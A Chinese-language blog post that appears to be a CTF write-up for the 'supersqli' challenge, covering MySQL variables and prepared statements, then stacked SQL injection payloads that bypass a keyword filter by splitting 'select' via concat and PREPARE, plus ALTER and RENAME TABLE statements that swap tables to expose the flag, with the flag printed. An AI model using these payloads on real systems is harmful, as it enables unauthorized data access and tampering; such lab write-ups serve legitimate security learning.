---
layout:     post               # 使用的布局（不需要改）
title:      supersqli    # 标题 
subtitle:    攻防世界   #副标题
date:       2020-07-13         # 时间
author:     yanmie             # 作者
header-img: img/.jpg    ##标签这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               
    - CTF
  
---

## 前置知识

#### MySQL用户自定义变量详解

你可以利用SQL语句将值存储在用户自定义变量中，然后再利用另一条SQL语句来查询用户自定义变量。这样以来，可以再不同的SQL间传递值。

用户自定义变量的声明方法形如：@var_name，其中变量名称由字母、数字、“.”、“_” 和 “$” 组成。当然，在以字符串或者标识符引用时也可以包含其他字符（例如：@‘my-var’，@“my-var”，或者@`my-var`）。

用户自定义变量是会话级别的变量。其变量的作用域仅限于声明其的客户端链接。当这个客户端断开时，其所有的会话变量将会被释放。

用户自定义变量是不区分大小写的。

使用 SET 语句来声明用户自定义变量：

	SET @var_name = expr [, @var_name = expr] ...

在使用 SET 设置变量时，可以使用 “=” 或者 “:=” 操作符进行赋值。

当然，除了 SET 语句还有其他赋值的方式。比如下面这个例子，但是赋值操作符只能使用 “:=”。因为 “=” 操作符将会被认为是比较操作符。

```
mysql> SET @t1=1, @t2=2, @t3:=4;
mysql> SELECT @t1, @t2, @t3, @t4 := @t1+@t2+@t3;
+------+------+------+--------------------+
| @t1  | @t2  | @t3  | @t4 := @t1+@t2+@t3 |
+------+------+------+--------------------+
|    1 |    2 |    4 |                  7 |
+------+------+------+--------------------+
```

用户变量的类型仅限于：整形、浮点型、二进制与非二进制串和 NULL。在赋值浮点数时，系统不会保留精度。其他类型的值将会被转成相应的上述类型。比如：一个包含时间或者空间数据类型（temporal or spatial data type）的值将会转换成一个二进制串。

如果用户自定义变量的值以结果集形式返回，系统会将其转换成字符串形式。

如果查询一个没有初始化的变量，将会以字符串类型返回 NULL。

转载于https://blog.csdn.net/treasure99/article/details/96993862

#### MySQL的SQL预处理(Prepared)

MySQL 官方将 prepare、execute、deallocate 统称为 PREPARE STATEMENT。翻译也就习惯的称其为预处理语句。

MySQL 预处理语句的支持版本较早，所以我们目前普遍使用的 MySQL 版本都是支持这一语法的。

```
# 定义预处理语句
PREPARE stmt_name FROM preparable_stmt;
# 执行预处理语句
EXECUTE stmt_name [USING @var_name [, @var_name] ...];
# 删除(释放)定义
{DEALLOCATE | DROP} PREPARE stmt_name;
```

转载于：https://www.cnblogs.com/geaozhang/p/9891338.html



## 开始操作

直接进来，本以为是命令执行，结果不是。

发现是`sql注入`,

`1'`报错，`error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1`

从报错中得到字符型注入，闭合方式为单引号，还德到可以报错注入。

首先常规步骤走一哈子

## 联合查询

`?inject=1' order by 2--+`得到字段为2

`?inject=1' and select 1,2 --+`返回`return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);`,这也太尴尬了，直接过滤select,看来是联合查询搞不了了。

![UtnJDe.png](https://s1.ax1x.com/2020/07/13/UtnJDe.png)

## 报错注入

在刚开始的报错就说明了可以报错注入。

但是`updatexml`函数中含有update，所以不能使用，这里使用extractvalue.

`extractvalue(目标xml文档，xml路径)` :对XML文档进行查询的函数

`?inject=1' and extractvalue(1,concat(0x7e,database(),0x7e))--+`,

报错了`error 1105 : XPATH syntax error: '~supersqli~'`,得到数据库为`supersqli`

![UtuoWt.png](https://s1.ax1x.com/2020/07/13/UtuoWt.png)

但是之后就比较尴尬了。。。select又不能用。

## 堆叠注入

尝试一下堆叠注入吧。

`?inject=-1';show databases--+`让他显示出所有的数据库，哇塞，真的显示出来了。得到数据库`ctftraining`、`information_schema`、`mysql`、`performance_schema`、`supersqli`、`test`

```
array(1) {
  [0]=>
  string(11) "ctftraining"
}

array(1) {
  [0]=>
  string(18) "information_schema"
}

array(1) {
  [0]=>
  string(5) "mysql"
}

array(1) {
  [0]=>
  string(18) "performance_schema"
}

array(1) {
  [0]=>
  string(9) "supersqli"
}

array(1) {
  [0]=>
  string(4) "test"
}

```

这就比较棒了，

`?inject=--1';show tables;--+`查看一下当前数据库中的表，

```
array(1) {
  [0]=>
  string(16) "1919810931114514"
}

array(1) {
  [0]=>
  string(5) "words"
}

```
有一串数字很可疑，我们看一下他的字段。
	?inject=--1';desc `1919810931114514`;-+

注意:MySQL表名为纯数字时(表名和保留字冲突时也是加反引号)，要加反引号：desc `1919810931114514`

```
array(6) {
  [0]=>
  string(4) "flag"
  [1]=>
  string(12) "varchar(100)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}
```


有一个flag字段，不用`select`是肯定查不出来的，

虽然这里过滤了select和where等，但是可以通过执行多语句，将要执行的sql语句进行拼接，然后进行预处理，这样就可以将过滤的sql关键字拆分绕过检测。

concat的妙用：

```
mysql> select concat(1,2,3);
+---------------+
| concat(1,2,3) |
+---------------+
| 123           |
+---------------+
1 row in set (0.00 sec)
```

举例：

```
mysql> set @sql=concat('sele','ct user()');PREPARE sql_query from @sql;EXECUTE sql_query;
Query OK, 0 rows affected (0.00 sec)

Query OK, 0 rows affected (0.00 sec)
Statement prepared

+----------------+
| user()         |
+----------------+
| root@localhost |
+----------------+
1 row in set (0.00 sec)
```

PREPARE是预处理，这里预处理语句必须大写，格式就是PREPARE sql_query from @sql_query;execute sql_query;

所以这就好办了.
payload:

	?inject=-1';set @sql=concat('sele','ct flag from `1919810931114514`');PREPARE sql_query FROM @sql;EXECUTE sql_query;--+

得到flag:

```
array(1) {
  [0]=>
  string(38) "flag{c168d583ed0d4d7196967b28cbd0b5e9}"
}
```

## 另一种解法

利用`alter`修改表结构。

`?inject=-1';show tables;--+`

```
array(1) {
  [0]=>
  string(16) "1919810931114514"
}

array(1) {
  [0]=>
  string(5) "words"
}

```

当前用的是`words`表，查看一下他的结构。`?inject=-1';desc words;--+`,有两字段。

```
array(6) {
  [0]=>
  string(2) "id"
  [1]=>
  string(7) "int(10)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}

array(6) {
  [0]=>
  string(4) "data"
  [1]=>
  string(11) "varchar(20)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}
```

查看另一个表结构。
	?inject=-1';desc `1919810931114514`;--+


只有一个字段。

```
array(6) {
  [0]=>
  string(4) "flag"
  [1]=>
  string(12) "varchar(100)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}

```

先将含有flag表的结构改为和words表结构相同。

	?inject=-1';alter table`1919810931114514` add (id int(11) primary key auto_increment);--+

ok了：

```
array(6) {
  [0]=>
  string(4) "flag"
  [1]=>
  string(12) "varchar(100)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}

array(6) {
  [0]=>
  string(2) "id"
  [1]=>
  string(7) "int(11)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(3) "PRI"
  [4]=>
  NULL
  [5]=>
  string(14) "auto_increment"
}
```

应为现在他俩的字段还不一样，改为一样的字段。

	?inject=-1';alter table `1919810931114514` change flag data varchar(100) --+


改好了：

```
array(6) {
  [0]=>
  string(4) "data"
  [1]=>
  string(12) "varchar(100)"
  [2]=>
  string(3) "YES"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}

array(6) {
  [0]=>
  string(2) "id"
  [1]=>
  string(7) "int(11)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(3) "PRI"
  [4]=>
  NULL
  [5]=>
  string(14) "auto_increment"
}
```



那么接下来就是要把含有flag的表变为现在与页面交互的表。

先将words改为其他表,在将含有flag的表改为words表。

	?inject=-1';rename table `words` to `tables`;rename table `1919810931114514` to `words` --+

现在查询1即可得出flag，

```
array(2) {
  [0]=>
  string(38) "flag{c168d583ed0d4d7196967b28cbd0b5e9}"
  [1]=>
  string(1) "1"
}
```
